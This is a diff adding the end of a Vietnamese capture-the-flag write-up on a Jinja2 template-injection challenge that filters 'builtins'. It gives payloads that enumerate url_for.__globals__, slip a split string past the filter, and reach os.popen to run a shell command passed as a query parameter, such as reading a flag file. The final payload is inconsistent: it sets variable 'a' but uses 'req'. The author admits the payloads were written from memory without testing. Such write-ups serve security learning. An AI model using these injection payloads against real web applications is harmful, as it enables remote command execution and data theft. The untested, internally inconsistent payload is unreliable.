@@ -119,4 +119,29 @@ if __name__ == "__main__":
 ```
 Về cơ bản thì source code bài này giống với bài ssti 1 chỉ có một thay đổi là bị filter thêm chữ `builtins`.
 
-...
+Với bài này khi mình lên để viết writeup thì dường như server có vấn đề, mình không thể truyền param đi nên mình không ghi cụ thể chính xác được. 
+
+Nhưng mình sẽ nói sơ về ý tưởng thực hiện:
+
+Mình sử dụng payload để liệt kê ra tất cả các method và dễ dàng tìm chính xác vị trí của `request`
+```
+{% for i in url_for.__globa""ls__ %}{{i}}{% endfor %}
+
+```
+Ví dụ vị trí của method là 7 thì mình sẽ sử dụng:
+
+`{% set req=url_for.__globals__.pop((url_for.__globals__|list).__getitem__(7)) %}`
+
+`getitem` được sử dụng cho list nên đó là lí do mình chuyển `url_for.__globals__` thành list.
+
+Payload cuối cùng:
+
+```
+{%set a=url_for.__globals__.pop((url_for.__globals__|list).__getitem__(7)) %}{{url_for.__globals__.os.__dict__.popen(req.args.command).read()}}&command=cat /abc/flag.txt
+```
+Với bài này theo mình nhớ thì flag không nằm trong thư mục hiện tại, chuỗi mình truyền vào trong command chỉ là một ví dụ, các bạn có thể truyền v
+các command thích hợp để tìm được vị trí của flag.
+
+
+## End.
+### Thank you for being here!
